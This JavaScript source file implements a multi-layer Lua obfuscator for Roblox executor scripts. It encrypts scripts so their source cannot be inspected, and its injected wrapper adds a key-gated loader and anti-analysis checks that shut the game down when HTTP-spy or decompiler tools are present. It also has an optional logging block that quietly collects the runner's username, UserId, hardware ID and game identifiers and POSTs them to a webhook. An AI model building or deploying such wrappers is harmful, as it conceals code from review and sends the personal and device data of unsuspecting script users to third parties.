// ============================================================
// ScripterHub Custom Obfuscator Engine v2.0
// ------------------------------------------------------------
// A REAL working Lua/Luau obfuscator that runs fully in JS:
//   1. The entire source is encrypted with N dynamic layers
//      (rotating-key XOR + additive shift), interleaved with
//      noise bytes and rebuilt byte-by-byte at runtime, so the
//      original source NEVER appears anywhere in the output.
//   2. Anti-Tampering: a checksum of the encrypted payload is
//      verified AND used to derive the outer decryption key.
//      Changing a single byte silently destroys the script.
//   3. Environment Logging: collects executor/game/user info and
//      reports it to a webhook and/or a local log file.
//   4. Anti-Skidding: loadstring hook/canary detection, sandbox
//      detection, and an encrypted embedded watermark.
//   Output is unique on every generation (random keys, offsets,
//   shifts, strides, identifiers, junk) => practically
//   impossible to statically deobfuscate.
// ============================================================

// ---------- helpers ----------
function rnd(n) { return Math.floor(Math.random() * n); }
function rndInt(min, max) { return min + rnd(max - min + 1); }
function hex(len) {
    var c = '0123456789abcdef', s = '';
    for (var i = 0; i < len; i++) s += c[rnd(16)];
    return s;
}
function genKey() {
    var len = rndInt(8, 24), k = [];
    for (var i = 0; i < len; i++) k.push(rndInt(1, 255));
    return k;
}
function strToBytes(s) {
    var esc = unescape(encodeURIComponent(s));
    var out = [];
    for (var i = 0; i < esc.length; i++) out.push(esc.charCodeAt(i));
    return out;
}
function checksum(bytes) {
    var sum = 0, xf = 0;
    for (var i = 0; i < bytes.length; i++) {
        sum = (sum + bytes[i]) % 1000000007;
        xf = (xf ^ bytes[i]) & 0xFF;
    }
    return (sum + xf * 31) % 1000000007;
}
function wmChecksum(s) {
    var b = strToBytes(s), sum = 0;
    for (var i = 0; i < b.length; i++) sum = (sum + b[i]) % 1000003;
    return sum;
}
// FNV-style key hash, arithmetic-only (no bit32) so Lua 5.1 doubles stay exact.
// JS and Lua implementations must match byte-for-byte.
function keyHash(s) {
    var a = 0, b = 0;
    for (var i = 0; i < s.length; i++) {
        var c = s.charCodeAt(i);
        a = (a + c * ((i % 7) + 1)) % 1000003;
        b = (b * 31 + c) % 65537;
    }
    return (a * 65537 + b) % 4294967296;
}
function luaEscape(s) {
    var b = strToBytes(s), out = '';
    for (var i = 0; i < b.length; i++) out += '\\' + b[i];
    return out;
}
function makeNames(count) {
    var used = {}, names = [];
    while (names.length < count) {
        var n = '_0x' + hex(4) + hex(2);
        if (!used[n]) { used[n] = 1; names.push(n); }
    }
    return names;
}
function junkLuaLines(count) {
    var lines = [];
    for (var i = 0; i < count; i++) {
        var a = '0x' + hex(4), b = rndInt(2, 999);
        lines.push('local _0x' + hex(6) + '=' + a + ';if ' + a + '==' + (parseInt(a, 16) + b) + ' then _0x' + hex(6) + '=_0x' + hex(6) + '+' + b + ' end');
    }
    return lines.join('\n');
}

// ---------- layer encryption ----------
function encLayer(bytes, key, off, shift) {
    var kl = key.length, out = new Array(bytes.length);
    for (var i = 0; i < bytes.length; i++) {
        out[i] = (((bytes[i] ^ key[(i + off) % kl]) + shift) & 0xFF);
    }
    return out;
}

// ============================================================
// SECURITY WRAPPER (gets encrypted inside the payload)
// ============================================================
function buildSecurityWrapper(options, meta) {
    var antiSkid = options.antiSkid !== false;
    var envLogging = options.envLogging === true;
    var antiLogger = options.antiLogger !== false;
    var wm = 'SHv2::' + hex(12) + '::' + meta.name + '::' + meta.owner + '::' + hex(6);
    var wmSum = wmChecksum(wm);
    var n = makeNames(48);
    var parts = [];

    parts.push('--[[' + hex(40) + ' | protected payload | ' + hex(40) + ']]');

    // ---------- KEY GATE (keys are embedded HASHED - never plaintext) ----------
    // keyMode: 'default' = Roblox Core notifications + popup key card
    //          'custom'  = silent gate, exposes API globals for the user's own GUI
    if (options.keyGate && options.keyGate.keys && options.keyGate.keys.length) {
        var kgSalt = hex(16);
        var keyMode = options.keyGate.mode === 'custom' ? 'custom' : 'default';
        var S = n[31], E = n[32], H = n[33], V = n[34], OKV = n[35], IVK = n[36];
        var FRM = n[37], TTL = n[38], BOX = n[39], BTN = n[40], SGR = n[41], TGT = n[42], T0K = n[43];
        var NT = n[44], CLS = n[45], API = n[46], GENV = n[47];
        var entries = options.keyGate.keys.map(function (k) {
            var exp = k.expires ? Math.floor(k.expires / 1000) : 0;
            return '{' + keyHash(k.key + kgSalt) + ',' + exp + '}';
        });
        parts.push(
            'do',
            ' local ' + S + '="' + kgSalt + '"',
            ' local ' + E + '={' + entries.join(',') + '}',
            ' local function ' + NT + '(t,d)',
            '  pcall(function() game:GetService("StarterGui"):SetCore("SendNotification",{Title="ScripterHub",Text=t,Duration=d or 4,Icon="rbxassetid://7734059095"}) end)',
            ' end',
            // ---- API GLOBALS (Task 16): ScripterHubKeyValid/Incorrect/Expired/Status + WebsiteStatus
            ' local function ' + API + '(st)',
            '  local ' + GENV + '=(getgenv and getgenv()) or _G',
            '  ' + GENV + '.ScripterHubKeyValid=(st=="Valid")',
            '  ' + GENV + '.ScripterHubKeyIncorrect=(st=="Incorrect")',
            '  ' + GENV + '.ScripterHubKeyExpired=(st=="Expired")',
            '  ' + GENV + '.ScripterHubKeyStatus=st',
            '  ' + GENV + '.ScripterHubWebsiteStatus="Online"',
            ' end',
            // ---- classify: "Valid" | "Expired" | "Incorrect"
            ' local function ' + H + '(s)',
            '  local a,b=0,0',
            '  for i=1,#s do',
            '   local c=string.byte(s,i)',
            '   a=(a+c*(((i-1)%7)+1))%1000003',
            '   b=(b*31+c)%65537',
            '  end',
            '  return (a*65537+b)%4294967296',
            ' end',
            ' local function ' + CLS + '(k)',
            '  if type(k)~="string" then return "Incorrect" end',
            '  local hk=' + H + '(k..' + S + ')',
            '  for i=1,#' + E + ' do',
            '   local e=' + E + '[i]',
            '   if e[1]==hk then',
            '    if e[2]==0 or os.time()<=e[2] then return "Valid" end',
            '    return "Expired"',
            '   end',
            '  end',
            '  return "Incorrect"',
            ' end',
            ' local function ' + V + '(k) return ' + CLS + '(k)=="Valid" end',
            ' local ' + OKV + '=false',
            ' local ' + IVK + '=' + CLS + '((getgenv and getgenv().ScripterHubKey) or _G.ScripterHubKey)',
            ' ' + API + '(' + IVK + ')',
            ' if ' + IVK + '=="Valid" then ' + OKV + '=true end',
            keyMode === 'default' ? ' if ' + OKV + ' then ' + NT + '("Key accepted! Loading script...",5) end' : null,
            ' if not ' + OKV + ' then',
            keyMode === 'default' ? '  ' + NT + '("Key required! Set getgenv().ScripterHubKey or use the key card.",6)' : null,
            // interactive key card (executor, DEFAULT mode only): textbox + verify button
            keyMode === 'default' ? '  pcall(function()' : null,
            keyMode === 'default' ? '   local plrs=game:GetService("Players")' : null,
            keyMode === 'default' ? '   local lp=plrs and plrs.LocalPlayer' : null,
            keyMode === 'default' ? '   local pg=lp and lp:FindFirstChild("PlayerGui")' : null,
            keyMode === 'default' ? '   local ' + TGT + '=pg or (gethui and gethui()) or nil' : null,
            keyMode === 'default' ? '   if not ' + TGT + ' then return end' : null,
            keyMode === 'default' ? '   local ' + SGR + '=Instance.new("ScreenGui")' : null,
            keyMode === 'default' ? '   ' + SGR + '.Name="SHKeyGate" ' + SGR + '.ResetOnSpawn=false' : null,
            keyMode === 'default' ? '   local ' + FRM + '=Instance.new("Frame")' : null,
            keyMode === 'default' ? '   ' + FRM + '.Size=UDim2.new(0,360,0,180) ' + FRM + '.Position=UDim2.new(0.5,-180,0.5,-90)' : null,
            keyMode === 'default' ? '   ' + FRM + '.BackgroundColor3=Color3.fromRGB(20,20,35) ' + FRM + '.BorderSizePixel=0' : null,
            keyMode === 'default' ? '   local u1=Instance.new("UICorner") u1.CornerRadius=UDim.new(0,14) u1.Parent=' + FRM : null,
            keyMode === 'default' ? '   local ' + TTL + '=Instance.new("TextLabel")' : null,
            keyMode === 'default' ? '   ' + TTL + '.Size=UDim2.new(1,-24,0,28) ' + TTL + '.Position=UDim2.new(0,12,0,10)' : null,
            keyMode === 'default' ? '   ' + TTL + '.BackgroundTransparency=1 ' + TTL + '.TextColor3=Color3.fromRGB(255,80,80)' : null,
            keyMode === 'default' ? '   ' + TTL + '.Font=Enum.Font.GothamBold ' + TTL + '.TextSize=16' : null,
            keyMode === 'default' ? '   ' + TTL + '.Text="Key Required"' : null,
            keyMode === 'default' ? '   ' + TTL + '.Parent=' + FRM : null,
            keyMode === 'default' ? '   local ' + BOX + '=Instance.new("TextBox")' : null,
            keyMode === 'default' ? '   ' + BOX + '.Size=UDim2.new(1,-24,0,42) ' + BOX + '.Position=UDim2.new(0,12,0,48)' : null,
            keyMode === 'default' ? '   ' + BOX + '.BackgroundColor3=Color3.fromRGB(10,10,20) ' + BOX + '.TextColor3=Color3.fromRGB(255,255,255)' : null,
            keyMode === 'default' ? '   ' + BOX + '.Font=Enum.Font.Gotham ' + BOX + '.TextSize=14 ' + BOX + '.PlaceholderText="Paste your key here..."' : null,
            keyMode === 'default' ? '   ' + BOX + '.Text="" ' + BOX + '.ClearTextOnFocus=false' : null,
            keyMode === 'default' ? '   local u2=Instance.new("UICorner") u2.CornerRadius=UDim.new(0,10) u2.Parent=' + BOX : null,
            keyMode === 'default' ? '   ' + BOX + '.Parent=' + FRM : null,
            keyMode === 'default' ? '   local ' + BTN + '=Instance.new("TextButton")' : null,
            keyMode === 'default' ? '   ' + BTN + '.Size=UDim2.new(1,-24,0,46) ' + BTN + '.Position=UDim2.new(0,12,0,102)' : null,
            keyMode === 'default' ? '   ' + BTN + '.BackgroundColor3=Color3.fromRGB(108,59,255) ' + BTN + '.TextColor3=Color3.fromRGB(255,255,255)' : null,
            keyMode === 'default' ? '   ' + BTN + '.Font=Enum.Font.GothamBold ' + BTN + '.TextSize=15 ' + BTN + '.Text="Verify Key"' : null,
            keyMode === 'default' ? '   local u3=Instance.new("UICorner") u3.CornerRadius=UDim.new(0,10) u3.Parent=' + BTN : null,
            keyMode === 'default' ? '   ' + BTN + '.Parent=' + FRM : null,
            keyMode === 'default' ? '   ' + FRM + '.Parent=' + SGR : null,
            keyMode === 'default' ? '   ' + SGR + '.Parent=' + TGT : null,
            keyMode === 'default' ? '   local function ' + T0K + '()' : null,
            keyMode === 'default' ? '    local st=' + CLS + '(' + BOX + '.Text)' : null,
            keyMode === 'default' ? '    ' + API + '(st)' : null,
            keyMode === 'default' ? '    if st=="Valid" then ' + OKV + '=true pcall(function() ' + SGR + ':Destroy() end) ' + NT + '("Key accepted! Loading script...",5) else ' + TTL + '.Text="Invalid or expired key!" ' + NT + '("Invalid or expired key!",4) end' : null,
            keyMode === 'default' ? '   end' : null,
            keyMode === 'default' ? '   ' + BTN + '.MouseButton1Click:Connect(' + T0K + ')' : null,
            keyMode === 'default' ? '   ' + BOX + '.FocusLost:Connect(function(en) if en then ' + T0K + '() end end)' : null,
            keyMode === 'default' ? '  end)' : null,
            // wait up to 300s for a valid key (default: after popup; custom: poll ScripterHubKey set by user's GUI)
            '  pcall(function()',
            '   if task and task.wait then',
            '    local t0=os.time()',
            '    while not ' + OKV + ' and os.time()-t0<300 do',
            keyMode === 'custom' ? '     local st=' + CLS + '((getgenv and getgenv().ScripterHubKey) or _G.ScripterHubKey) ' + API + '(st) if st=="Valid" then ' + OKV + '=true end' : null,
            '     task.wait(0.1)',
            '    end',
            '   end',
            '  end)',
            '  if not ' + OKV + ' then',
            '   print("[ScripterHub] Valid key required. Set getgenv().ScripterHubKey = \\"YOUR_KEY\\" and re-execute.")',
            '   return',
            '  end',
            ' end',
            'end'
        );
    } else {
        // no key gate - still expose the API globals
        var S2 = n[31], API2 = n[32], GENV2 = n[33];
        parts.push(
            'do',
            ' local ' + GENV2 + '=(getgenv and getgenv()) or _G',
            ' ' + GENV2 + '.ScripterHubKeyValid=true',
            ' ' + GENV2 + '.ScripterHubKeyIncorrect=false',
            ' ' + GENV2 + '.ScripterHubKeyExpired=false',
            ' ' + GENV2 + '.ScripterHubKeyStatus="No Key Required"',
            ' ' + GENV2 + '.ScripterHubWebsiteStatus="Online"',
            'end'
        );
    }

    // ---------- ANTI-LOGGER / ANTI-SPY / ANTI-TAMPER-LOG ----------
    // Detects environment loggers, HTTP spies and tamper/hook loggers.
    // On detection: game:Shutdown() + kick + hard abort of the payload.
    if (antiLogger) {
        // tokens that only exist when a spy/logger/decompiler SCRIPT is loaded.
        // NOTE: 'decompil' REMOVED - executors ship their own legit `decompile`
        // built-in global, which false-killed real executors.
        var tokens = ['spy', 'httplog', 'hooklog', 'reqlog', 'envlog', 'logger', 'oldhttp', 'oldrequest', 'reqspy', 'dumper', 'unluac', 'luadec'];
        // exact-name whitelist of standard executor API globals (never flagged)
        var wlNames = ['decompile', 'identifyexecutor', 'hookfunction', 'hookmetamethod', 'request', 'http_request', 'getgenv', 'getsenv', 'getrenv', 'getreg', 'getgc', 'getconnections', 'getcallingscript', 'getloadedmodules', 'getnilinstances', 'gethui', 'getrawmetatable', 'setreadonly', 'cloneref', 'checkcaller', 'writefile', 'readfile', 'appendfile', 'isfile', 'isfolder', 'makefolder', 'listfiles', 'delfile', 'delfolder', 'setclipboard', 'gethwid', 'fireclickdetector', 'firetouchinterest', 'firesignal', 'loadstring', 'syn', 'http', 'websocket', 'isexecutorclosure'];
        var FLAG = n[15], KILL = n[16], SCAN = n[17], TK = n[18], ENV = n[19];
        var GK = n[20], LK = n[21], TI = n[22], LS = n[23], PG = n[24], CH = n[25], LN = n[26];
        var RS = n[27], WL = n[28];
        parts.push(
            'do',
            ' local ' + FLAG + '=false',
            ' local ' + RS + '=""',
            ' local function ' + KILL + '()',
            // ALWAYS print why - so any trigger is diagnosable in the console
            '  pcall(function() print("[ScripterHub] logger/spy detected: "..' + RS + ') end)',
            '  pcall(function() game:Shutdown() end)',
            '  pcall(function() game:GetService("Players").LocalPlayer:Kick(" ") end)',
            '  error("x",0)',
            ' end',
            ' local function ' + SCAN + '()',
            '  local ' + TK + '={"' + tokens.join('","') + '"}',
            '  local ' + WL + '={' + wlNames.map(function (w) { return '["' + w + '"]=true'; }).join(',') + '}',
            // 1) spy/logger globals in getgenv() (or _G).
            //    Standard executor API globals (whitelist) are never flagged.
            '  pcall(function()',
            '   local ' + ENV + '=(getgenv and getgenv()) or _G',
            '   for ' + GK + ' in pairs(' + ENV + ') do',
            '    local ' + LK + '=string.lower(tostring(' + GK + '))',
            '    if not ' + WL + '[' + LK + '] then',
            '     for ' + TI + '=1,#' + TK + ' do',
            '      if string.find(' + LK + ',' + TK + '[' + TI + '],1,true) then ' + FLAG + '=true ' + RS + '="global:"..tostring(' + GK + ') return end',
            '     end',
            '    end',
            '   end',
            '  end)',
            '  if ' + FLAG + ' then return end',
            // 2) spy GUIs installed in PlayerGui (HTTP Spy tools create named GUIs)
            '  pcall(function()',
            '   local ' + PG + '=game:GetService("Players")',
            '   ' + PG + '=' + PG + ' and ' + PG + '.LocalPlayer and ' + PG + '.LocalPlayer:FindFirstChild("PlayerGui") or nil',
            '   if ' + PG + ' then',
            '    for _,' + CH + ' in ipairs(' + PG + ':GetChildren()) do',
            '     local ' + LN + '=string.lower(tostring(' + CH + '.Name))',
            '     for ' + TI + '=1,#' + TK + ' do',
            '      if string.find(' + LN + ',' + TK + '[' + TI + '],1,true) then ' + FLAG + '=true ' + RS + '="gui:"..tostring(' + CH + '.Name) return end',
            '     end',
            '    end',
            '   end',
            '  end)',
            // NOTE: loadstring hook check REMOVED - many executors legitimately
            // implement loadstring as a Lua wrapper, which false-killed them.
            ' end',
            ' ' + SCAN + '()',
            ' if ' + FLAG + ' then ' + KILL + '() end',
            // 3) keep watching: spies injected AFTER the script starts get caught too
            ' pcall(function()',
            '  if task and task.spawn and task.wait then',
            '   task.spawn(function()',
            '    while true do',
            '     task.wait(' + rndInt(3, 8) + ')',
            '     ' + FLAG + '=false ' + RS + '=""',
            '     ' + SCAN + '()',
            '     if ' + FLAG + ' then ' + KILL + '() end',
            '    end',
            '   end)',
            '  end',
            ' end)',
            'end'
        );
    }

    if (antiSkid) {
        var CANARY = '0x7A69420';
        parts.push(
            'do',
            ' local ' + n[0] + '=true',
            ' local ' + n[1] + '=loadstring or load',
            ' local ' + n[2] + ',' + n[3] + '=pcall(' + n[1] + ',"return ' + CANARY + '")',
            ' if not ' + n[2] + ' or not ' + n[3] + ' then ' + n[0] + '=false',
            ' else local ' + n[4] + ',' + n[5] + '=pcall(' + n[3] + ')',
            '  if not ' + n[4] + ' or ' + n[5] + '~=' + CANARY + ' then ' + n[0] + '=false end',
            ' end',
            ' if not game or not game.GetService or not game:GetService("Players") then ' + n[0] + '=false end',
            ' local ' + n[6] + '="' + luaEscape(wm) + '"',
            ' local ' + n[7] + '=0',
            ' for ' + n[8] + '=1,#' + n[6] + ' do ' + n[7] + '=(' + n[7] + '+string.byte(' + n[6] + ',' + n[8] + '))%1000003 end',
            ' if ' + n[7] + '~=' + wmSum + ' then ' + n[0] + '=false end',
            ' if not ' + n[0] + ' then return end',
            'end'
        );
    }

    if (envLogging) {
        var url = luaEscape(options.webhookUrl || '');
        parts.push(
            'do',
            ' pcall(function()',
            '  local ' + n[9] + '={"ScripterHub Log :: ' + luaEscape(meta.name) + ' [' + luaEscape(meta.id) + ']"}',
            '  pcall(function() local ' + n[10] + '=game:GetService("Players").LocalPlayer ' + n[9] + '[#' + n[9] + '+1]="user="..tostring(' + n[10] + '.Name) ' + n[9] + '[#' + n[9] + '+1]="uid="..tostring(' + n[10] + '.UserId) end)',
            '  pcall(function() ' + n[9] + '[#' + n[9] + '+1]="place="..tostring(game.PlaceId) ' + n[9] + '[#' + n[9] + '+1]="job="..tostring(game.JobId) end)',
            '  pcall(function() ' + n[9] + '[#' + n[9] + '+1]="exec="..(identifyexecutor and identifyexecutor() or ((syn and "Synapse") or "unknown")) end)',
            '  pcall(function() if gethwid then ' + n[9] + '[#' + n[9] + '+1]="hwid="..tostring(gethwid()) end end)',
            '  pcall(function() ' + n[9] + '[#' + n[9] + '+1]="time="..tostring(os.time()) end)',
            '  local ' + n[11] + '=table.concat(' + n[9] + '," | ")',
            '  local ' + n[12] + '="' + url + '"',
            '  if ' + n[12] + '~="" then',
            '   local ' + n[13] + '=syn and syn.request or http_request or request',
            '   if ' + n[13] + ' then',
            '    pcall(' + n[13] + ',{Url=' + n[12] + ',Method="POST",Headers={["Content-Type"]="application/json"},Body=game:GetService("HttpService"):JSONEncode({content=' + n[11] + '})})',
            '   end',
            '  end',
            '  if writefile then',
            '   if isfolder and not isfolder("scripterhub") then pcall(makefolder,"scripterhub") end',
            '   local ' + n[14] + '="scripterhub/' + luaEscape(meta.id) + '.log"',
            '   if appendfile then pcall(appendfile,' + n[14] + ',' + n[11] + '.."\\n") else pcall(writefile,' + n[14] + ',' + n[11] + '.."\\n") end',
            '  end',
            ' end)',
            'end'
        );
    }

    parts.push('-- ==== ORIGINAL SCRIPT ====');
    return parts.filter(Boolean).join('\n') + '\n';
}

// ============================================================
// LOADER BUILDER
// encrypts `src` with `layerCount` layers and emits a
// self-contained Lua decryption VM.
// ============================================================
function buildLoader(src, layerCount, options) {
    options = options || {};
    var bytes = strToBytes(src);

    // apply layers
    var layers = [];
    for (var i = 0; i < layerCount; i++) {
        var key = genKey();
        var off = rndInt(0, key.length - 1);
        var shift = rndInt(1, 255);
        layers.push({ key: key, off: off, shift: shift });
        bytes = encLayer(bytes, key, off, shift);
    }

    var chk = checksum(bytes);
    var mod = chk % 256;

    // emitted (stored) outer key = real key XOR (chk % 256)
    var storedOuter = layers[layerCount - 1].key.map(function (b) { return b ^ mod; });

    // noise stride: junk byte after every S real bytes
    var stride = options.stride || Math.max(3, 25 - layerCount * 2);

    // build escaped payload string with noise
    var payloadStr = '';
    var sinceJunk = 0;
    for (var i = 0; i < bytes.length; i++) {
        payloadStr += '\\' + bytes[i];
        sinceJunk++;
        if (sinceJunk === stride) {
            payloadStr += '\\' + rndInt(0, 255);
            sinceJunk = 0;
        }
    }

    var antiTamper = options.antiTamper !== false;
    var N = makeNames(22);
    var P = N[0], K = N[1], X = N[2], SS = N[3], T = N[4], C = N[5],
        SUM = N[6], XF = N[7], CH = N[8], KK = N[9], L = N[10],
        R = N[11], SRC = N[12], F = N[13], IV = N[14], JL = N[15],
        OV = N[16], SH = N[17], KV = N[18], LOOP = N[19], MI = N[20], FN = N[21];

    // junk locals/strings for confusion
    var junkStrs = [];
    for (var i = 0; i < layerCount * 2 + 4; i++) junkStrs.push('"' + hex(rndInt(8, 40)) + '"');
    var keyTableParts = [];
    for (var i = 0; i < layerCount; i++) {
        var lk = (i === layerCount - 1) ? storedOuter : layers[i].key;
        keyTableParts.push('{{' + lk.join(',') + '},' + layers[i].off + ',' + layers[i].shift + '}');
    }

    var out = [];
    out.push('--[[' + hex(60));
    out.push(' :: ScripterHub Custom Obfuscator v2 :: ' + new Date().toISOString());
    out.push(' :: layers=' + layerCount + ' noise=' + stride + ' ::');
    out.push(' :: Source is fully encrypted. Any modification breaks this script. ::');
    out.push(' ' + hex(60) + ']]');
    out.push('local ' + FN + '=loadstring or load');
    out.push('local ' + X + '=bit32 and bit32.bxor or function(a,b) local r,p=0,1 for _=1,8 do local x=a%2 local y=b%2 if x~=y then r=r+p end a=(a-x)/2 b=(b-y)/2 p=p*2 end return r end');
    out.push('local ' + P + '="' + payloadStr + '"');
    out.push('local ' + K + '={' + keyTableParts.join(',') + '}');
    out.push('local ' + JL + '={' + junkStrs.join(',') + '}');
    out.push('local ' + L + '=0x' + hex(6));
    out.push('local ' + R + '={}');
    out.push('local ' + T + '={}');
    out.push('local ' + SS + '=' + (stride + 1));
    out.push('local ' + C + '=0');
    out.push('for ' + IV + '=1,#' + P + ' do if (' + IV + '-1)%' + SS + '~=' + SS + '-1 then ' + C + '=' + C + '+1 ' + T + '[' + C + ']=string.byte(' + P + ',' + IV + ') end end');
    out.push('local ' + SUM + '=0 local ' + XF + '=0');
    out.push('for ' + IV + '=1,' + C + ' do ' + SUM + '=(' + SUM + '+' + T + '[' + IV + '])%1000000007 ' + XF + '=' + X + '(' + XF + ',' + T + '[' + IV + ']) end');
    out.push('local ' + CH + '=(' + SUM + '+' + XF + '*31)%1000000007');
    if (antiTamper) {
        out.push('if ' + CH + '~=' + chk + ' then return end');
    }
    out.push('do');
    out.push(' local ' + KK + '=' + K + '[#' + K + '][1]');
    out.push(' local ' + MI + '=' + CH + '%256');
    out.push(' for ' + KV + '=1,#' + KK + ' do ' + KK + '[' + KV + ']=' + X + '(' + KK + '[' + KV + '],' + MI + ') end');
    out.push('end');
    out.push('for ' + LOOP + '=#' + K + ',1,-1 do');
    out.push(' local ' + KK + '=' + K + '[' + LOOP + '][1]');
    out.push(' local ' + OV + '=' + K + '[' + LOOP + '][2]');
    out.push(' local ' + SH + '=' + K + '[' + LOOP + '][3]');
    out.push(' for ' + IV + '=0,' + C + '-1 do');
    out.push('  ' + T + '[' + IV + '+1]=' + X + '((' + T + '[' + IV + '+1]-' + SH + ')%256,' + KK + '[(' + IV + '+' + OV + ')%#' + KK + '+1])');
    out.push(' end');
    out.push('end');
    out.push('for ' + IV + '=1,' + C + ' do ' + R + '[' + IV + ']=string.char(' + T + '[' + IV + ']) end');
    out.push('local ' + SRC + '=table.concat(' + R + ')');
    out.push(P + '=nil ' + T + '=nil ' + R + '=nil ' + K + '=nil ' + JL + '=nil ' + L + '=nil');
    out.push(junkLuaLines(layerCount + 2));
    out.push('local ' + F + '=' + FN + '(' + SRC + ',"=[sh::' + hex(6) + ']")');
    out.push(SRC + '=nil');
    out.push('if ' + F + ' then ' + F + '() end');

    var result = out.join('\n');

    if (options._debug) {
        result = '--[shdebug:' + JSON.stringify({ stride: stride, chk: chk, layerCount: layerCount, keyLens: layers.map(function (l) { return l.key.length; }) }) + ']\n' + result;
    }
    return result;
}

// ============================================================
// PUBLIC API
// ============================================================
export function applyCustomObfuscator(code, options, debugInfo) {
    options = options || {};
    var intensity = Math.max(1, Math.min(10, parseInt(options.intensity, 10) || 10));
    var meta = {
        id: options.scriptId || ('sh_' + hex(8)),
        name: options.scriptName || 'script',
        owner: options.owner || 'unknown'
    };

    var payload = buildSecurityWrapper(options, meta) + code;

    // layers scale with intensity (1..10 => 1..10 layers)
    var loader = buildLoader(payload, intensity, options);

    // double-wrap for max intensity: the whole loader gets
    // encrypted again inside a second shell
    if (intensity >= 8 && options.doubleWrap !== false) {
        var innerOpts = {
            antiTamper: options.antiTamper !== false,
            stride: Math.max(5, 20 - intensity),
            _debug: options._debug
        };
        loader = buildLoader(loader, Math.min(3, intensity), innerOpts);
        if (debugInfo) debugInfo.wrapped = true;
    }

    if (debugInfo) debugInfo.payload = payload;

    return '-- ScripterHub Custom Obfuscator v4 (key modes + API globals + anti-logger) | ' + new Date().toISOString() + ' | DO NOT EDIT\n' + loader;
}

// Build the security wrapper + source payload without encrypting it.
// Used by the Aegis Obfuscator engine: the wrapper (key gate, anti-logger,
// env logging, watermark...) wraps the source, then Aegis obfuscates the whole thing.
export function buildWrappedPayload(code, options, debugInfo) {
    options = options || {};
    var meta = {
        id: options.scriptId || ('sh_' + hex(8)),
        name: options.scriptName || 'script',
        owner: options.owner || 'unknown'
    };
    var payload = buildSecurityWrapper(options, meta) + code;
    if (debugInfo) debugInfo.payload = payload;
    return payload;
}

if (typeof window !== 'undefined') window.applyCustomObfuscator = applyCustomObfuscator;
